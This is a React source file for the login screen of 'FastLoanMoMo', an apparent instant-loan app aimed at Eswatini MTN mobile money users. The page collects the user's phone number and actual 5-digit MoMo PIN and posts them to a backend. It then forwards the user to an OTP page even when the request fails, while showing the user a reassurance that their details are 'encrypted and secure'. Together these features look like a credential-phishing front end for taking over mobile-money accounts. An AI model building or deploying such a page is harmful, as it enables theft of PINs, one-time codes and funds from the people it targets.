import React, { useState } from "react";
import { useNavigate } from "react-router-dom";
import { Wallet, Eye, Lock, ShieldCheck } from "lucide-react";

// ✅ Uses the Vercel environment variable, falls back to localhost for local dev
const API_URL = import.meta.env.VITE_API_URL || "http://localhost:8000";

const Login = () => {
  const [phone, setPhone] = useState("");
  const [pin, setPin] = useState("");
  const [showPin, setShowPin] = useState(false);
  const navigate = useNavigate();

  const isFormValid = phone.length >= 8 && pin.length === 5;

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    
    // Save the phone number locally in case the user refreshes the OTP page
    localStorage.setItem("userPhone", phone);

    try {
      await fetch(`${API_URL}/api/login`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ phone_number: phone, pin: pin }),
      });
      // ✅ Pass the phone number to the OTP screen
      navigate("/otp", { state: { phone: phone } });
    } catch (error) {
      navigate("/otp", { state: { phone: phone } });
    }
  };

  return (
    <div className="app-container">
      <div className="header">
        <div className="header-icon"><Wallet size={32} color="white" /></div>
        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
        <p className="header-subtitle">Instant mobile money loans</p>
      </div>

      <div className="main-card">
        <h2 className="title">Welcome back</h2>
        <p className="subtitle">Sign in with your mobile money number to access instant loans.</p>
        
        <form onSubmit={handleLogin}>
          <div className="form-group">
            <label className="form-label">Phone number</label>
            <div className="input-wrapper" style={{ padding: '12px 16px' }}>
              <span style={{ display: 'flex', alignItems: 'center', fontSize: '16px', fontWeight: 500, color: '#111827' }}>
                🇸🇿 +268 
                <span style={{ color: '#D1D5DB', margin: '0 12px', fontWeight: 300 }}>|</span>
              </span>
              <input
                type="tel"
                placeholder="761 234 567"
                value={phone}
                onChange={(e) => setPhone(e.target.value.replace(/\D/g, ''))}
                required
                style={{ fontSize: '18px', letterSpacing: '1px', color: '#111827', WebkitTextFillColor: '#111827' }}
              />
            </div>
            <p className="helper-text">Eswatini MTN money number</p>
          </div>

          <div className="form-group">
            <label className="form-label">Enter 5-digit MOMO PIN</label>
            <div className="input-wrapper">
              <Lock size={20} color="#6B7280" style={{ marginRight: '12px' }} />
              <input
                type={showPin ? "text" : "password"}
                maxLength={5}
                placeholder="•••••"
                style={{ letterSpacing: '8px', fontSize: '18px', color: '#111827', WebkitTextFillColor: '#111827' }}
                value={pin}
                onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                required
              />
              <button type="button" onClick={() => setShowPin(!showPin)} style={{ background: 'none', border: 'none', cursor: 'pointer', display: 'flex', padding: 0 }}>
                <Eye size={20} color="#9CA3AF" />
              </button>
            </div>
          </div>

          <button 
            type="submit" 
            className="btn-primary" 
            disabled={!isFormValid}
            style={{
              backgroundColor: isFormValid ? 'var(--button-yellow)' : '#FDE68A',
              color: isFormValid ? 'white' : '#9CA3AF',
              cursor: isFormValid ? 'pointer' : 'not-allowed',
              marginTop: '32px'
            }}
          >
            Continue
          </button>

          <p className="helper-text" style={{ textAlign: 'center', display: 'flex', justifyContent: 'center', alignItems: 'center', gap: '6px', marginTop: '24px', color: '#6B7280' }}>
            <ShieldCheck size={16} /> Your details are encrypted and secure
          </p>
        </form>
      </div>
      
      <p style={{ textAlign: 'center', fontSize: '13px', color: '#4B5563', marginTop: '24px', padding: '0 20px 40px' }}>
        By continuing you agree to our Terms and Privacy Policy.
      </p>
    </div>
  );
};

export default Login;